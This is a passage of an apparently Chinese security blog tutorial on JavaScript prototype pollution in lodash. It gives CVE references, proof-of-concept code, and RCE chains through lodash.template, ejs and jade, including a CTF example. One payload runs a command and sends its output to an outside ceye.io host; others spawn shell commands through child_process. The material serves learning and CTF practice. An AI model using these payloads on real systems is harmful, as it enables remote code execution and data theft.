class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">_recursiveMerge</span>(<span class="hljs-params">base, extend</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isPlainObject</span>(base))<br>        <span class="hljs-keyword">return</span> extend;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> key <span class="hljs-keyword">in</span> extend)<br>        base[key] = (<span class="hljs-title function_">isPlainObject</span>(base[key]) &amp;&amp; <span class="hljs-title function_">isPlainObject</span>(extend[key])) ?<br>            <span class="hljs-title function_">_recursiveMerge</span>(base[key], extend[key]) :<br>            extend[key];<br>    <span class="hljs-keyword">return</span> base;<br>&#125;<br></code></pre></td></tr></table></figure><p>值得注意的是<code>_merge</code>方法有一处过滤，过滤了一些关键词</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (key === <span class="hljs-string">&#x27;__proto__&#x27;</span> &#124;&#124; key === <span class="hljs-string">&#x27;constructor&#x27;</span> &#124;&#124; key === <span class="hljs-string">&#x27;prototype&#x27;</span>)<br>   <span class="hljs-keyword">continue</span>;<br></code></pre></td></tr></table></figure><p>但是检查的范围仅仅是key，我们再嵌套一层数组即可，也就是payload：<code>&#123;&quot;x&quot;: &#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;:&quot;yes&quot;&#125;&#125;&#125;</code></p><h2 id="0x03-Lodash中的污染"><a href="#0x03-Lodash中的污染" class="headerlink" title="0x03 Lodash中的污染"></a>0x03 Lodash中的污染</h2><h3 id="lodash-defaultsDeep"><a href="#lodash-defaultsDeep" class="headerlink" title="lodash.defaultsDeep"></a>lodash.defaultsDeep</h3><p>漏洞编号CVE-2019-10744，需要引入<a href="mailto:&#108;&#111;&#x64;&#x61;&#115;&#104;&#64;&#x34;&#46;&#x31;&#55;&#x2e;&#x31;&#49;">&#108;&#111;&#x64;&#x61;&#115;&#104;&#64;&#x34;&#46;&#x31;&#55;&#x2e;&#x31;&#49;</a>(ver&lt;4.17.12)，poc如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> mergeFn = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>).<span class="hljs-property">defaultsDeep</span>;<br><span class="hljs-keyword">const</span> payload = <span class="hljs-string">&#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;whoami&quot;: &quot;Vulnerable&quot;&#125;&#125;&#125;&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">check</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">mergeFn</span>(&#123;&#125;, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(payload));<br>    <span class="hljs-keyword">if</span> ((&#123;&#125;)[<span class="hljs-string">`a0`</span>] === <span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Vulnerable to Prototype Pollution via <span class="hljs-subst">$&#123;payload&#125;</span>`</span>);<br>    &#125;<br>  &#125;<br><br><span class="hljs-title function_">check</span>();<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property">whoami</span>);<br><span class="hljs-comment">//打印Vulnerable</span><br></code></pre></td></tr></table></figure><h3 id="lodash-merge"><a href="#lodash-merge" class="headerlink" title="lodash.merge"></a>lodash.merge</h3><p>这里使用ver 4.17.4才好使。</p><p>与前面提到的merge相似，poc如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> lodash= <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><span class="hljs-keyword">var</span> payload = <span class="hljs-string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;:&quot;yes&quot;&#125;&#125;&#x27;</span>;<br><br><span class="hljs-keyword">var</span> a = &#123;&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Before polluted: &quot;</span> + a.<span class="hljs-property">polluted</span>);<br>lodash.<span class="hljs-title function_">merge</span>(&#123;&#125;, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(payload));<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;After polluted: &quot;</span> + a.<span class="hljs-property">polluted</span>);<br></code></pre></td></tr></table></figure><h3 id="lodash-mergeWith"><a href="#lodash-mergeWith" class="headerlink" title="lodash.mergeWith"></a>lodash.mergeWith</h3><p>漏洞编号CVE-2018-16487，相比于merge增加了一个参数<code>customizer</code>，作用是控制合并方式，若<code>customizer</code>未定义则依然由merge替代，因此事实上它对我们的利用方式没有影响，poc不变</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> lodash= <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><span class="hljs-keyword">var</span> payload = <span class="hljs-string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;:&quot;yes&quot;&#125;&#125;&#x27;</span>;<br><br><span class="hljs-keyword">var</span> a = &#123;&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Before polluted: &quot;</span> + a.<span class="hljs-property">polluted</span>);<br>lodash.<span class="hljs-title function_">merge</span>(&#123;&#125;, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(payload));<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;After polluted: &quot;</span> + a.<span class="hljs-property">polluted</span>);<br></code></pre></td></tr></table></figure><h3 id="lodash-set"><a href="#lodash-set" class="headerlink" title="lodash.set"></a>lodash.set</h3><p>修改指定path(对象属性)的value(值)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">set</span>(object, path, value)<br><span class="hljs-comment">//object (Object): 要修改的对象。</span><br><span class="hljs-comment">//path (Array&#124;string): 要设置的对象路径。</span><br><span class="hljs-comment">//value (*): 要设置的值。</span><br></code></pre></td></tr></table></figure><p>注意此方法会直接改变Object。例如给多层嵌套的属性c赋值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> lodash= <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><span class="hljs-keyword">var</span> object = &#123; <span class="hljs-string">&#x27;a&#x27;</span>: [&#123; <span class="hljs-string">&#x27;b&#x27;</span>: &#123; <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">3</span> &#125; &#125;] &#125;;<br>lodash.<span class="hljs-title function_">set</span>(object, <span class="hljs-string">&#x27;a[0].b.c&#x27;</span>, <span class="hljs-number">4</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object.<span class="hljs-property">a</span>[<span class="hljs-number">0</span>].<span class="hljs-property">b</span>.<span class="hljs-property">c</span>);<br><span class="hljs-comment">//打印</span><br><span class="hljs-comment">//4</span><br></code></pre></td></tr></table></figure><p>跟一下源码，首先set调了baseSet</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">set</span>(<span class="hljs-params">object, path, value</span>) &#123;<br>  <span class="hljs-keyword">return</span> object == <span class="hljs-literal">null</span> ? object : <span class="hljs-title function_">baseSet</span>(object, path, value);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是castPath，stringToPath，最后也没有任何过滤，poc</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> lodash= <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><br><span class="hljs-keyword">var</span> object_1 = &#123; <span class="hljs-string">&#x27;a&#x27;</span>: [&#123; <span class="hljs-string">&#x27;b&#x27;</span>: &#123; <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">3</span> &#125; &#125;] &#125;;<br><span class="hljs-keyword">var</span> object_2 = &#123;&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object_1.<span class="hljs-property">whoami</span>);<br><span class="hljs-comment">//lodash.set(object_2, &#x27;object_2[&quot;__proto__&quot;][&quot;whoami&quot;]&#x27;, &#x27;Vulnerable&#x27;);</span><br>lodash.<span class="hljs-title function_">set</span>(object_2, <span class="hljs-string">&#x27;__proto__.[&quot;whoami&quot;]&#x27;</span>, <span class="hljs-string">&#x27;Vulnerable&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object_1.<span class="hljs-property">whoami</span>);<br><span class="hljs-comment">//打印</span><br><span class="hljs-comment">//undefined</span><br><span class="hljs-comment">//Vulnerable</span><br></code></pre></td></tr></table></figure><h3 id="lodash-setWith"><a href="#lodash-setWith" class="headerlink" title="lodash.setWith"></a>lodash.setWith</h3><p>与mergeWith类似，相比于set方法多一个customizer参数控制设置对象值的方式，不传入也不影响我们的利用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> lodash= <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><br><span class="hljs-keyword">var</span> object_1 = &#123; <span class="hljs-string">&#x27;a&#x27;</span>: [&#123; <span class="hljs-string">&#x27;b&#x27;</span>: &#123; <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">3</span> &#125; &#125;] &#125;;<br><span class="hljs-keyword">var</span> object_2 = &#123;&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object_1.<span class="hljs-property">whoami</span>);<br><span class="hljs-comment">//lodash.setWith(object_2, &#x27;object_2[&quot;__proto__&quot;][&quot;whoami&quot;]&#x27;, &#x27;Vulnerable&#x27;);</span><br>lodash.<span class="hljs-title function_">setWith</span>(object_2, <span class="hljs-string">&#x27;__proto__.[&quot;whoami&quot;]&#x27;</span>, <span class="hljs-string">&#x27;Vulnerable&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object_1.<span class="hljs-property">whoami</span>);<br></code></pre></td></tr></table></figure><h3 id="lodash-zipObjectDeep"><a href="#lodash-zipObjectDeep" class="headerlink" title="lodash.zipObjectDeep"></a>lodash.zipObjectDeep</h3><p>漏洞编号CVE-2020-8203，影响版本ver&lt;4.17.16</p><p>zipObjectDeep(props, values) ，props为属性路径，values是值，两者都为数组。</p><p>源码里给出了注释</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">_.<span class="hljs-title function_">zipObjectDeep</span>([<span class="hljs-string">&#x27;a.b[0].c&#x27;</span>, <span class="hljs-string">&#x27;a.b[1].d&#x27;</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>]);  <br><span class="hljs-comment">// =&gt; &#123; &#x27;a&#x27;: &#123; &#x27;b&#x27;: [&#123; &#x27;c&#x27;: 1 &#125;, &#123; &#x27;d&#x27;: 2 &#125;] &#125; &#125;</span><br></code></pre></td></tr></table></figure><p>将两个对象合并成了一个数组，并完成赋值，左边数组的键值与右边数组的值一一对应。</p><p>那么如果我们传入单元素数组<code>__proto__</code>，就可以污染原型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> _ = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><br>_.<span class="hljs-title function_">zipObjectDeep</span>([<span class="hljs-string">&#x27;__proto__.z&#x27;</span>],[<span class="hljs-number">666</span>])<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(z)<br><span class="hljs-comment">//打印</span><br><span class="hljs-comment">//666</span><br></code></pre></td></tr></table></figure><h2 id="0x04-Lodash-RCE"><a href="#0x04-Lodash-RCE" class="headerlink" title="0x04 Lodash RCE"></a>0x04 Lodash RCE</h2><p>注意lodash ver&lt;&#x3D;4.17.4。</p><h3 id="lodash-template-RCE"><a href="#lodash-template-RCE" class="headerlink" title="lodash.template   RCE"></a>lodash.template   RCE</h3><p>Lodash.template 是 Lodash 中的一个简单的模板引擎用于输出渲染，而template方法中的<code>sourceURL</code>存在拼接，关键代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> result = <span class="hljs-title function_">attempt</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Function</span>(importsKeys, sourceURL + <span class="hljs-string">&#x27;return &#x27;</span> + source)<br>    .<span class="hljs-title function_">apply</span>(<span class="hljs-literal">undefined</span>, importsValues);<br>&#125;);<br></code></pre></td></tr></table></figure><p>如果我们能够污染<code>sourceURL</code>属性，将其赋值为<code>xxx\r\n &lt;code&gt; \r\n</code>就可实现命令注入，因此关键点在于原型链的污染。</p><p>注意Function中没有require方法，但我们可以使用<code>global.process.mainModule.constructor._load</code>来代替。</p><p>这里提供一道例题**[Code-Breaking 2018] Thejs**，源码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> lodash = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>)<br><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>)<br><span class="hljs-keyword">const</span> randomize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;randomatic&#x27;</span>)<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>()<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123;<span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span>&#125;)).<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>())<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;/static&#x27;</span>, express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&#x27;static&#x27;</span>))<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;thejs.session&#x27;</span>,<br>    <span class="hljs-attr">secret</span>: <span class="hljs-title function_">randomize</span>(<span class="hljs-string">&#x27;aA0&#x27;</span>, <span class="hljs-number">16</span>),<br>    <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span><br>&#125;))<br>app.<span class="hljs-title function_">engine</span>(<span class="hljs-string">&#x27;ejs&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">filePath, options, callback</span>) &#123; <span class="hljs-comment">// define the template engine</span><br>    fs.<span class="hljs-title function_">readFile</span>(filePath, <span class="hljs-function">(<span class="hljs-params">err, content</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-title function_">callback</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(err))<br>        <span class="hljs-keyword">let</span> compiled = lodash.<span class="hljs-title function_">template</span>(content)<br>        <span class="hljs-keyword">let</span> rendered = <span class="hljs-title function_">compiled</span>(&#123;...options&#125;)<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, rendered)<br>    &#125;)<br>&#125;)<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, <span class="hljs-string">&#x27;./views&#x27;</span>)<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>)<br><br>app.<span class="hljs-title function_">all</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> data = req.<span class="hljs-property">session</span>.<span class="hljs-property">data</span> &#124;&#124; &#123;<span class="hljs-attr">language</span>: [], <span class="hljs-attr">category</span>: []&#125;<br>    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>        data = lodash.<span class="hljs-title function_">merge</span>(data, req.<span class="hljs-property">body</span>)<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">data</span> = data<br>    &#125;<br><br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123;<br>        <span class="hljs-attr">language</span>: data.<span class="hljs-property">language</span>,<br>        <span class="hljs-attr">category</span>: data.<span class="hljs-property">category</span><br>    &#125;)<br>&#125;)<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Example app listening on port 3000!`</span>))<br></code></pre></td></tr></table></figure><p>可以看到同时使用了<code>Lodash.template</code>与<code>Lodash.merge</code>，merge方法在lodash漏洞版本内，因此我们就可以直接去污染</p><p><code>sourceURL</code>实现RCE，以下是payload。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">//执行并外带，设置type为json</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;sourceURL&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;xxx\r\nvar require = global.require &#124;&#124; global.process.mainModule.constructor._load;var result = require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString();var req = require(&#x27;http&#x27;).request(`http://xxxxx.ceye.io/$&#123;result&#125;`);req.end();\r\n&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="lodash-amp-ejs-RCE"><a href="#lodash-amp-ejs-RCE" class="headerlink" title="lodash &amp; ejs RCE"></a>lodash &amp; ejs RCE</h3><p>漏洞编号CVE-2022-29078，Nodejs 的 ejs 模板引擎存在一个利用原型污染进行 RCE 的一个漏洞。但要实现 RCE，首先需要有原型链污染，这里我们暂且使用 lodash.merge 方法中的原型链污染漏洞。</p><p>漏洞成因其实和lodash.template是一样的，都是变量存在拼接，同时配合merge污染。漏洞关键代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//ejs.js compile方法</span><br><span class="hljs-comment">//....</span><br>    <span class="hljs-keyword">if</span> (opts.<span class="hljs-property">outputFunctionName</span>) &#123;<br>        prepended += <span class="hljs-string">&#x27;  var &#x27;</span> + opts.<span class="hljs-property">outputFunctionName</span> + <span class="hljs-string">&#x27; = __append;&#x27;</span> + <span class="hljs-string">&#x27;\n&#x27;</span>;<br>      &#125;<br><span class="hljs-comment">//....</span><br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">source</span> = prepended + <span class="hljs-variable language_">this</span>.<span class="hljs-property">source</span> + appended;<br><span class="hljs-comment">//.... </span><br><span class="hljs-comment">//source -&gt; src</span><br><span class="hljs-comment">//....</span><br>fn = <span class="hljs-keyword">new</span> <span class="hljs-title function_">ctor</span>(opts.<span class="hljs-property">localsName</span> + <span class="hljs-string">&#x27;, escapeFn, include, rethrow&#x27;</span>, src); <span class="hljs-comment">//此处执行</span><br><br></code></pre></td></tr></table></figure><p>很明显污染<code>outputFunctionName</code>即可。</p><p>测试代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> lodash = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><span class="hljs-keyword">var</span> ejs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ejs&#x27;</span>);<br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-comment">//设置模板的位置与种类</span><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, __dirname);<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views engine&#x27;</span>,<span class="hljs-string">&#x27;ejs&#x27;</span>);<br><br><span class="hljs-comment">//对原型进行污染</span><br><span class="hljs-keyword">var</span> malicious_payload = <span class="hljs-string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;);var __tmp2&quot;&#125;&#125;&#x27;</span>;<br>lodash.<span class="hljs-title function_">merge</span>(&#123;&#125;, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(malicious_payload));<br><br><span class="hljs-comment">//进行渲染</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-property">render</span> (<span class="hljs-string">&quot;index.ejs&quot;</span>,&#123;<br>        <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;success&#x27;</span><br>    &#125;);<br>&#125;);<br><br><span class="hljs-comment">//设置http</span><br><span class="hljs-keyword">var</span> server = app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">8000</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><br>    <span class="hljs-keyword">var</span> host = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">address</span><br>    <span class="hljs-keyword">var</span> port = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">port</span><br><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;应用实例，访问地址为 http://%s:%s&quot;</span>, host, port)<br>&#125;);<br></code></pre></td></tr></table></figure><p>运行后访问触发render函数渲染，即可RCE。</p><h3 id="lodash-amp-jade-RCE"><a href="#lodash-amp-jade-RCE" class="headerlink" title="lodash &amp; jade RCE"></a>lodash &amp; jade RCE</h3><p>Nodejs 的 jade 模板引擎也存在一个利用原型污染进行 RCE 的一个漏洞。但要实现 RCE，首先需要有原型链污染，这里我们依然使用 lodash.merge 方法中的原型链污染漏洞。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> lodash= <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><span class="hljs-keyword">var</span> jade = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jade&#x27;</span>);<br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-comment">//设置模板的位置与种类</span><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, __dirname);<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;view engine&quot;</span>, <span class="hljs-string">&quot;jade&quot;</span>);<br><br><span class="hljs-comment">//对原型进行污染</span><br><span class="hljs-keyword">var</span> malicious_payload = <span class="hljs-string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;console.log(global.process.mainModule.require(\&#x27;child_process\&#x27;).execSync(\&#x27;calc\&#x27;))&quot;&#125;&#125;&#x27;</span>;<br>lodash.<span class="hljs-title function_">merge</span>(&#123;&#125;, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(malicious_payload));<br><br><span class="hljs-comment">//进行渲染</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-property">render</span> (<span class="hljs-string">&quot;index.jade&quot;</span>,&#123;<br>        <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;success&#x27;</span><br>    &#125;);<br>&#125;);<br><br><span 